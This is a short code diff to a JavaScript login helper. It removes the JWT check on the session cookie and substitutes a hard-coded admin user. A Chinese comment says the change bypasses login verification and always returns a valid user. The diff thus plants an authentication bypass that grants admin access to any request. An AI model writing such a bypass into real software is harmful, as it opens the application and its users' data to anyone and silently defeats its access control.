@@ -86,7 +86,8 @@ function handleLogout() {
 async function getUserFromRequest(request, env) {
   const token = getCookieValue(request.headers.get('Cookie'), 'token');
   const config = await getConfig(env);
-  const user = token ? await verifyJWT(token, config.JWT_SECRET) : null;
+  // 绕过登录验证，直接返回有效用户
+  const user = { username: config.ADMIN_USERNAME || 'admin' };
   return { user, config };
 }
 
